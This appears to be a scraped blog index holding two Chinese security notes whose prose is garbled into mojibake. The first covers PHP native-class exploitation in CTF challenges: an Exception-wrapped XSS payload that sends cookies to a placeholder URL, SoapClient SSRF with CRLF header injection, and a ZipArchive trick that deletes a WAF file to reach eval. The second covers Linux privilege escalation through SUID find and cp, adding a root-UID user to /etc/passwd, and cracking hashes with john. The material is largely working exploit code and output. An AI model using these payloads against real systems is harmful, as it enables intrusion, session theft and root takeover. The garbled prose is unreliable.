é™¤æ­¤ä¹‹å¤–å…¶å®SplFileObjectç±»ï¼Œåªèƒ½è¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå†…å®¹ï¼Œå¦‚æœæƒ³è¦å…¨éƒ¨è¯»å–å°±éœ€è¦ç”¨åˆ°foreachå‡½æ•°ï¼Œä½†è‹¥é¢˜ç›®ä¸­æ²¡æœ‰ç»™å‡ºforeachå‡½æ•°çš„è¯ï¼Œå°±è¦ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶çš„å†…å®¹ 12345&lt;?phpecho new SplFileObject(&quot;./flag.php&quot;);echo &quot;\\n&quot;;echo new SplFileObject(&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;);?&gt; è¾“å‡ºå¦‚ä¸‹: 123&lt;?phpPD9waHANCiRmbGFnID0gImZsYWd7ekl4eWRfaXNfaGFja2VyfSI7DQo/Pg== base64è§£ç ï¼š 123&lt;?php$flag = &quot;flag{zIxyd_is_hacker}&quot;;?&gt; æŠ¥é”™ç±»Error/ExceptionERROR é€‚ç”¨äºphp7ç‰ˆæœ¬Errorç±»å°±æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œå®ƒå†…ç½®æœ‰ä¸€ä¸ªtoStringçš„æ–¹æ³•ã€‚EXCEPTION é€‚ç”¨äºphp5ã€7ç‰ˆæœ¬è¿™ä¸ªç±»åˆ©ç”¨çš„æ–¹å¼å’ŒåŸç†å’ŒError ç±»ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯é€‚ç”¨äºphp5å’Œphp7ï¼Œç›¸å¯¹ä¹‹ä¸‹æ›´åŠ å¥½ç”¨ Error/Exception_XSS[BJDCTF 2nd]xssä¹‹å…‰ æ‰«åå°ï¼Œæœ‰.git æ³„éœ²,githackä¸‹è½½ä¸‹æ¥ 123&lt;?php$a = $_GET['yds_is_so_beautiful'];echo unserialize($a); æºç åªæœ‰è¿™ä¸‰è¡Œï¼›å¯è§¦å‘åºåˆ—åŒ–ä¸­çš„é­”æœ¯æ–¹æ³•__toString 1234567891011121314151617&lt;?php$y1ng = new Exception(&quot;&lt;script&gt;window.open('url/?'+document.cookie);&lt;/script&gt;&quot;);echo urlencode(serialize($y1ng));?&gt;//window.open æ˜¯ javaScript æ‰“å¼€æ–°çª—å£çš„æ–¹æ³•#ä¹Ÿå¯ä»¥ç”¨window.location.href='url'æ¥å®ç°æ¶æ„è·³è½¬&lt;?php$a = new Exception(&quot;&lt;script&gt;window.location.href='url'+document.cookie&lt;/script&gt;&quot;);echo urlencode(serialize($a));?&gt;#æˆ–è€…ç”¨alert(document.cookie)ç›´æ¥å¼¹å‡ºcookieï¼Œä½†æ­¤é¢˜ä¸è¡Œï¼Œå¯èƒ½å¼€äº†httponlyã€‚&lt;?php$y1ng = new Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);echo urlencode(serialize($y1ng));?&gt; flagå°±åœ¨cookiesä¸­ Error/Exception_ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ12345678910111213141516171819&lt;?php$a = new Exception(&quot;deadbeef&quot;,1);$b = new Exception(&quot;deadbeef&quot;,2);echo $a;echo &quot;\\n&quot;;echo $b;echo &quot;\\n&quot;;if($a != $b){ echo &quot;a!=b&quot;.&quot;\\n&quot;;}if(md5($a) === md5($b)){ echo &quot;md5ç›¸ç­‰&quot;.&quot;\\n&quot;;}if(sha1($a)=== sha1($b)){ echo &quot;sha1ç›¸ç­‰&quot;;}?&gt; 123456789Exception: deadbeef in E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:2Stack trace:#0 {main}Exception: deadbeef in E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:2Stack trace:#0 {main}a!=bmd5ç›¸ç­‰sha1ç›¸ç­‰ å½“å˜é‡a,båŒæ—¶è§¦å‘__toString()æ–¹æ³•æ—¶ï¼Œè™½å¯¹è±¡ä¸åŒï¼Œä½†æ‰§è¡Œ__toString()æ–¹æ³•åï¼Œè¿”å›ç»“æœç›¸åŒï¼›è¿™é‡Œéœ€è¦æ³¨æ„a,bèµ‹å€¼æ—¶ï¼Œå¿…é¡»è¦åœ¨åŒä¸€è¡Œä¸Šï¼Œå› ä¸ºæ‰§è¡Œ__toString()æ–¹æ³•æ—¶ä¼šè¿”å›è¡Œå·ã€‚è™½ç„¶å¼ºç¢°æ’ä¹Ÿå¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸å¦‚ç”¨æŠ¥é”™ç±»ç»•è¿‡çš„å¥½ï¼Œå¼ºç¢°æ’ç»•è¿‡çš„å­—ç¬¦éå¸¸é•¿ï¼Œå¦‚æœå¯¹å­—ç¬¦é•¿åº¦åšäº†é™åˆ¶çš„è¯å¯ä»¥è€ƒè™‘åˆ©ç”¨æŠ¥é”™ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ å…¶ä»–ç±»ReflectionMethod è·å–ç±»æ–¹æ³•çš„ç›¸å…³ä¿¡æ¯å¯ä»¥ç»“åˆgetDocComment() æ–¹æ³•ï¼Œç”¨å®ƒæ¥è·å–ç±»ä¸­å„ä¸ªå‡½æ•°æ³¨é‡Šå†…å®¹ 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class Sentiment{ /** flag{zIxyd_is_hacker} */public function a(){ }}$a = $_GET['a'];$b = $_GET['b'];$c= $_GET['c'];$d=new $a($b,$c);var_dump($d-&gt;getDocComment());?&gt; 12http://127.0.0.1/test.php?a=ReflectionMethod&amp;b=Sentiment&amp;c=a#E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:14: string(28) &quot;/** flag{zIxyd_is_hacker} */&quot; SoapClient ç±»è¿›è¡Œ SSRFPHP çš„å†…ç½®ç±» SoapClient æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼ŒSOAP åè®®æ˜¯ä¸€ç§åŸºäº XML çš„åè®®,ç”¨äºåœ¨ Web åº”ç”¨ç¨‹åºä¹‹é—´è¿›è¡Œäº¤äº’ï¼Œä¸»è¦ç”¨äº Web æœåŠ¡;WSDL:æ˜¯ä¸€ç§ XML æ–‡æ¡£ï¼Œç”¨äºæè¿° Web æœåŠ¡ã€‚ è¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª __call æ–¹æ³•ï¼Œå½“ __call æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª __call æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚ è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š 1public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ]) ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚ ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚ 123456&lt;?php$a = new SoapClient(null,array('uri'=&gt;'zIxy', 'location'=&gt;'http://81.71.13.76:6666/'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function(); 1234567891011ubuntu@zIxyd:~$ nc -lnnp 6666POST / HTTP/1.1Host: 81.71.13.76:6666Connection: Keep-AliveUser-Agent: PHP-SOAP/7.3.4Content-Type: text/xml; charset=utf-8SOAPAction: &quot;zIxy#not_exists_function&quot;Content-Length: 383&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;zIxy&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; ä»ç»“æœæˆ‘ä»¬å¯ä»¥çœ‹åˆ°SOAPActionå‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨SOAPActionå¤„æ³¨å…¥æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬POSTæäº¤çš„headerå°±æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ³¨å…¥æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ“ä½œäº†ã€‚ å°è¯•ä¼ å…¥token,å‘ç°æ–°çš„é—®é¢˜ï¼ŒContent-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Type,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ® åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢ï¼Œé€šè¿‡user_agentåŒæ ·å¯ä»¥æ³¨å…¥CRLF,æ§åˆ¶Content-Typeçš„å€¼ CRLF Injection å°è¯•æ§åˆ¶token 12345678910111213141516&lt;?php$target = 'http://81.71.13.76:6666';$post_string = 'token=ly0n';$headers = array( 'X-Forwarded-For: 127.0.0.1', );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'zIxyd^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt; 12345678910111213141516ubuntu@zIxyd:~$ nc -lnnp 6666POST / HTTP/1.1Host: 81.71.13.76:6666Connection: Keep-AliveUser-Agent: zIxydContent-Type: application/x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Content-Length: 11token=zIxydContent-Type: text/xml; charset=utf-8SOAPAction: &quot;aaab#not_exists_function&quot;Content-Length: 383&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;aaab&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; æˆåŠŸæ§åˆ¶ ä½¿ç”¨SoapClientååºåˆ—åŒ–+CRLFå¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚ã€‚ 1Deserialization + __call + SoapClient + CRLF = SSRF SoapClient__Examplectfshow_web259 hintï¼š 1234567891011121314#flag.php$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);array_pop($xff);$ip = array_pop($xff);if($ip!=='127.0.0.1'){ die('error');}else{ $token = $_POST['token']; if($token=='ctfshow'){ file_put_contents('flag.txt',$flag); }} æºç ï¼š 123456789#index.php&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET['vip']);//vip can get flag one key$vip-&gt;getFlag(); ç›®çš„æ˜¯åœ¨index.phpé€šè¿‡ååºåˆ—åŒ–ä¸€ä¸ªåŸç”Ÿç±»å‘flag.phpå‘é€è¯·æ±‚ï¼Œç„¶åflag.phpç”¨file_put_contentsæŠŠflagæ”¾åˆ°flag.txté‡Œ exp 1234567891011&lt;?php$target = 'http://127.0.0.1/flag.php';$post_string = 'token=ctfshow';$b = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;'zIxyd^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'. '^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string, 'uri'=&gt; &quot;zIxyd&quot;));$a = serialize($b);$a = str_replace('^^',&quot;\\r\\n&quot;,$a);echo urlencode($a);?&gt; ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶ é€‚ç”¨äºPHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0 ä¸€ä¸ªç”¨ Zip å‹ç¼©çš„æ–‡ä»¶å­˜æ¡£ã€‚ å¯ä»¥é€šè¿‡æœ¬ç±»æ‰§è¡Œä¸€äº›æ–‡ä»¶æ“ä½œï¼Œåœ¨CTFå¯ä»¥ç”¨æ¥åˆ é™¤waf å¸¸ç”¨ç±»æ–¹æ³•ï¼š 12345678ZipArchive::addEmptyDirï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç›®å½•ZipArchive::addFileï¼šå°†æ–‡ä»¶æ·»åŠ åˆ°æŒ‡å®šzipå‹ç¼©åŒ…ä¸­ZipArchive::addFromStringï¼šæ·»åŠ æ–°çš„æ–‡ä»¶åŒæ—¶å°†å†…å®¹æ·»åŠ è¿›å»ZipArchive::closeï¼šå…³é—­ziparchiveZipArchive::extractToï¼šå°†å‹ç¼©åŒ…è§£å‹ZipArchive::openï¼šæ‰“å¼€ä¸€ä¸ªzipå‹ç¼©åŒ…ZipArchive::deleteIndexï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼šdeleteIndex(0)ä»£è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶ZipArchive::deleteNameï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶åç§°ï¼ŒåŒæ—¶ä¹Ÿå°†æ–‡ä»¶åˆ é™¤ å®ä¾‹ä»£ç ï¼š 1234&lt;?php$zip = new ZipArchive;$zip-&gt;open('filename', ZipArchive::CREATE)?&gt; è¯¥æ–¹æ³•ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æˆ–ç°æœ‰çš„zipå­˜æ¡£ä»¥è¿›è¡Œè¯»å–ï¼Œå†™å…¥æˆ–ä¿®æ”¹ã€‚ 12345678filenameï¼šè¦æ‰“å¼€çš„ZIPå­˜æ¡£çš„æ–‡ä»¶åã€‚flagsï¼šç”¨äºæ‰“å¼€æ¡£æ¡ˆçš„æ¨¡å¼ã€‚æœ‰ä»¥ä¸‹å‡ ç§æ¨¡å¼ï¼šZipArchive::OVERWRITEï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–æˆ–åˆ é™¤ã€‚ZipArchive::CREATEï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚ZipArchive::RDONLYï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚ZipArchive::EXCLï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚ZipArchive::CHECKCONSï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚æ³¨æ„ï¼Œå¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°cons ZipArchive_Exampleæ–°å»ºä¸€ä¸ªwaf.txtæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ 1this_is_test æ–°å»ºä¸€ä¸ªtest.phpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829&lt;?phphighlight_file(__FILE__);error_reporting(0);class zIxyd { public $object; public $filename; public $content; public $code; public function __destruct() { echo &quot;Can you hack me?&quot;; $this-&gt;object-&gt;open($this-&gt;filename,$this-&gt;content); if(!file_get_contents(&quot;waf.txt&quot;)){ eval($this-&gt;code); }else{ echo file_get_contents(&quot;waf.txt&quot;); } }}$code = $_POST['code'];if(isset($code)){ unserialize($code);}else{ echo &quot;Please input your code&quot;;} ä»£ç å¾ˆæ˜æ˜¾ï¼Œåªæœ‰ä¸å­˜åœ¨waf.txtæ–‡ä»¶ï¼Œå³å¯rce; å­˜åœ¨openå‡½æ•°ï¼Œé€šè¿‡ZipArchiveç›´æ¥è°ƒç”¨openæ–¹æ³•åˆ é™¤ç›®æ ‡æœºä¸Šçš„æ–‡ä»¶ poc: 12345678910111213141516&lt;?phpclass zIxyd { public $object; public $filename; public $content; public $code;}$a = new zIxyd();$a -&gt;object = new ZipArchive();$a -&gt;filename = &quot;waf.txt&quot;;$a -&gt;content = ZipArchive::OVERWRITE;$a -&gt;code = &quot;phpinfo();&quot;;echo serialize($a);","link":"/2023/11/20/PHP_%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"},{"title":"Linuxææƒæ€»ç»“","text":"å‰è¨€è®°å½•ä¸€äº›å¸¸è§çš„éæ¼æ´(é…ç½®ä¸å½“)ææƒç¬”è®°ï¼›è¿˜æœ‰ä¸€äº›linuxå†…æ ¸ç‰ˆæœ¬å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´éœ€è¦è‡ªè¡Œgoogle. suidææƒ åªå¯¹å¯æ‰§è¡Œæ–‡ä»¶ç”Ÿæ•ˆï¼Œä»»ä½•ç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶éƒ½æ˜¯ä»¥æ–‡ä»¶æ‰€å±è€…èº«ä»½è¿è¡Œçš„ã€‚ SUIDï¼ˆSet User IDï¼‰æ˜¯ä¸€ç§æƒé™ä½ï¼Œç”¨äºåœ¨æ‰§è¡Œæ–‡ä»¶æ—¶æš‚æ—¶å°†è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ· ID æ›´æ”¹ä¸ºæ–‡ä»¶æ‰€æœ‰è€…çš„ç”¨æˆ· IDã€‚å®ƒæ˜¯ä¸€ç§ç‰¹æ®Šæƒé™è®¾ç½®ï¼Œå¯è®©éç‰¹æƒç”¨æˆ·ä»¥è¶…çº§ç”¨æˆ·æƒé™è¿è¡Œå…·æœ‰ SUID æ ‡å¿—çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ æŸ¥æ‰¾å…·æœ‰sæƒé™çš„äºŒè¿›åˆ¶æ–‡ä»¶ 1find / -perm -u=s -type f 2&gt;/dev/null findåšä¸€ä¸ªå®éªŒä½¿å¾—findå‘½ä»¤æœ‰sæƒé™ï¼Œæ¥ææƒã€ 12345678910111213141516171819202122â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ whoamikaliâ”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ which find/usr/bin/findâ”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ ls -l /usr/bin/find-rwxr-xr-x 1 root root 224848 7æœˆ 2æ—¥ 13:26 /usr/bin/findâ”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo chmod u+s /usr/bin/findâ”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ ls -l /usr/bin/find-rwsr-xr-x 1 root root 224848 7æœˆ 2æ—¥ 13:26 /usr/bin/find#ç”±rwxå˜æˆäº†rwsâ”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ find /etc/passwd -exec &quot;whoami&quot; \\;root cpåšä¸€ä¸ªå®éªŒä½¿å¾—cpå‘½ä»¤æœ‰sæƒé™ï¼Œæ¥ææƒã€å½“ç„¶ä¸æ­¢äºfind,cpå‘½ä»¤ï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªç½‘å€ï¼šclick me å½“cpæœ‰suidæƒé™æ—¶ï¼Œå¯ä»¥æ”¹å†™åªèƒ½rootè®¿é—®çš„æ–‡ä»¶ï¼Œæ¯”å¦‚/etc/passwdæˆ–/etc/shadowä¸­çš„å†…å®¹ é¦–å…ˆç”¨opensslç”Ÿæˆä¸€ä¸ªå¯†ç ï¼Œpasswdå‚æ•°è¡¨ç¤ºç”Ÿæˆä¸€ä¸ªå¯†ç ï¼Œ-1è¡¨ç¤ºmd5,-salkè¡¨ç¤ºç›(éšæ„æŒ‡å®š)ï¼Œæœ€åè·Ÿè¦åŠ å¯†çš„å€¼ 12â””â”€$ openssl passwd -1 -salt 1 123abc $1$1$dzqAUU/vB2clNL4EHnbXq0 ç„¶åå¾€/etc/passwdæ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œç”¨æˆ·åéšæ„å–ï¼Œå¯†ç ä¸è¦ç”¨x,è¦ç”¨æˆ‘ä»¬ä¸Šé¢ç”Ÿæˆçš„å¯†ç ï¼Œå…¶ä»–çš„æŒ‰ç…§rootçš„å†™å³å¯ 123456789101112131415161718â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ sudo chmod u+s /usr/bin/cp â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ ls -l /usr/bin/cp -rwsr-xr-x 1 root root 151152 2022å¹´ 9æœˆ20æ—¥ /usr/bin/cp â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ cp /etc/passwd ./ â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ vim passwd #åœ¨æœ€åæ·»åŠ ä¸€è¡Œ:test:$1$1$dzqAUU/vB2clNL4EHnbXq0:0:0:root:/root:/usr/bin/zshâ”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ cp ./passwd /etc/passwd â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ su test å¯†ç ï¼š #è¿™é‡Œè¾“å…¥ä¹‹å‰opensslåŠ å¯†çš„ '123abc'â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢]â””â”€# #ææƒæˆåŠŸ å»ä¿®æ”¹/etc/sudoersåº”è¯¥ç®€å•ç‚¹ è¡¥å……ä¸€ä¸‹linuxçš„shadowæ–‡ä»¶ä¸­çš„ç¬¬äºŒä¸ªå­—æ®µä¿å­˜äº†åŠ å¯†åçš„å¯†ç ï¼ŒåŠ å¯†æ•°æ®çš„æ ¼å¼ä¸º $type$salt$encryptedï¼Œå…¶ä¸­typeæ˜¯æç¤ºç¬¦ï¼Œsaltæ˜¯éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œencryptedæ˜¯æ˜æ–‡å¯†ç å’Œsalté€šè¿‡cryptå‡½æ•°åŠ å¯†åçš„ç»“æœã€‚åœ¨åŠ å¯†æ•°æ®ä¸­çš„æç¤ºç¬¦typeç”¨æ¥æ ‡è¯†é‡‡ç”¨äº†å“ªç§åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„æ ‡è¯†ç¬¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š 1 ä»£è¡¨é‡‡ç”¨äº†MD5åŠ å¯†æ–¹å¼2 Blowfishï¼Œæ˜¯æœ€æ—©çš„ç‰ˆæœ¬ï¼Œæœ‰ä¸€äº›ç¼ºé™·ï¼Œä¸æ¨èä½¿ç”¨2a Blowfishï¼Œæ˜¯ä¿®å¤äº†ä¸€äº›ç¼ºé™·åçš„ç‰ˆæœ¬ï¼Œä½†ä»ç„¶æœ‰ä¸€äº›é—®é¢˜ï¼Œä¸æ¨èä½¿ç”¨2b Blowfishï¼Œæ˜¯ä¿®å¤äº†2aä¸­çš„é—®é¢˜åçš„ç‰ˆæœ¬ï¼Œæ˜¯å®‰å…¨ã€å¸¸ç”¨çš„ç‰ˆæœ¬2y Blowfishï¼ŒEksblowfishç‰ˆæœ¬y æ˜¯YescryptåŠ å¯†æ–¹å¼çš„å‰ç¼€ï¼Œæ˜¯BlowfishåŠ å¯†æ–¹å¼çš„ä¸€ä¸ªå˜ç§ï¼Œæä¾›äº†æ›´é«˜çš„å®‰å…¨æ€§å’Œæ€§èƒ½5 ä»£è¡¨é‡‡ç”¨äº†SHA256åŠ å¯†æ–¹å¼6 ä»£è¡¨é‡‡ç”¨äº†SHA512åŠ å¯†æ–¹å¼ åœ¨çº¿å“ˆå¸Œè¯†åˆ«å™¨ï¼šclick me /etc/shadowä¸­çš„å¯†ç å¯ä»¥ç”¨johnå·¥å…·(kaliè‡ªå¸¦)ç ´è§£ï¼Œèƒ½ä¸èƒ½ç ´è§£æˆåŠŸå–å†³äºä½ çš„dictã€‚ 123456789101112131415161718192021222324252627â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ echo &quot;\\$1\\$1\\$dzqAUU/vB2clNL4EHnbXq0&quot; &gt; hashâ”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ john hash --wordlist=/usr/share/wordlists/rockyou.txtWarning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status123abc (?) #è¿™é‡ŒæˆåŠŸç ´è§£å‡ºå¯†ç ä¸º'123abc'1g 0:00:00:00 DONE (2023-12-05 12:53) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. #è¿™é‡Œéœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œjohnä¸ä¼šç ´è§£ä¹‹å‰å·²ç»ç ´è§£è¿‡çš„å¯†æ–‡ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹ä¹‹å‰ç ´è§£çš„å¯†æ–‡æ–¹æ³•ä¸€â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ cat /home/kali/.john/john.pot$1$1$dzqAUU/vB2clNL4EHnbXq0:123abcæ–¹æ³•äºŒâ”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ john --show hash ?:123abc å½“ç„¶johnè¿˜æœ‰å¾ˆå¤šç”¨æ³•,æ¯”å¦‚ç ´è§£å—å¯†ç ä¿æŠ¤çš„Zipå‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä¸ä¸€ä¸€è®°å½•; å¯ä»¥å‚è€ƒ å®˜æ–¹Wiki å†dockerä¸­su username,å¯èƒ½ä¼šæŠ¥must be run from terminal;è§£å†³æ–¹æ¡ˆï¼šclink me ç”¨çš„æ¯”è¾ƒå¤šçš„è§£å†³æ–¹æ¡ˆï¼š 1python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot; sudoææƒsudoææƒåŸºæœ¬ç¦»ä¸å¼€/etc/sudoersæ–‡ä»¶ï¼Œ /etc/sudoersæ–‡ä»¶æ˜¯ä¸€ä¸ªç”¨äºé…ç½®sudoå‘½ä»¤çš„æ–‡ä»¶ï¼Œå®ƒå®šä¹‰äº†å“ªäº›ç”¨æˆ·æˆ–ç”¨æˆ·ç»„æœ‰æƒåˆ©ä»¥rootç”¨æˆ·çš„æƒé™æ¥æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤ã€‚è¿™ä¸ªæ–‡ä»¶é€šå¸¸ä½äºLinuxç³»ç»Ÿä¸­çš„/etcç›®å½•ä¸‹ã€‚sudoersæ–‡ä»¶çš„å†…å®¹å¯ä»¥æŒ‡å®šå“ªäº›ç”¨æˆ·å¯ä»¥ä»¥rootç”¨æˆ·çš„æƒé™æ‰§è¡Œå“ªäº›å‘½ä»¤ï¼Œä»¥åŠæ˜¯å¦éœ€è¦è¾“å…¥å¯†ç 